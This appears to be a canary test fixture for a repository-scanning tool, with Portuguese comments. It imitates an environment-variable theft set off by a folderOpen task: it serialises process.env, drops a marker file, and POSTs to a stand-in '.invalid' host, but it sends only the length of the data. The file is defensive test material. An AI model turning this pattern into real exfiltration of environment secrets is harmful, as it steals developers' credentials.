// ARQUIVO-CANÁRIO DE TESTE do RepoGuard-Nudge.
//
// Imita a FORMA de um roubo de variáveis de ambiente disparado por uma
// tarefa folderOpen, mas é inofensivo:
// - o conteúdo do ambiente NUNCA é enviado; vai só o TAMANHO dele;
// - o destino é um domínio .invalid, que por norma (RFC 6761) nunca resolve;
// - grava um arquivo-marcador na pasta atual, para provar se e onde rodou.
//   Se o marcador aparecer no projeto, a tarefa rodou na sua máquina.
const fs = require('fs');
const path = require('path');

const ambiente = JSON.stringify(process.env);
const destino = 'https://coleta.exemplo.invalid/env';

fs.writeFileSync(
  path.join(process.cwd(), 'CANARIO-TASKS-EXECUTADO.txt'),
  `A tarefa folderOpen do fixture adversarial rodou em ${new Date().toISOString()} (plataforma: ${process.platform}).\n`,
);

if (typeof fetch === 'function') {
  fetch(destino, { method: 'POST', body: String(ambiente.length) }).catch(() => undefined);
}
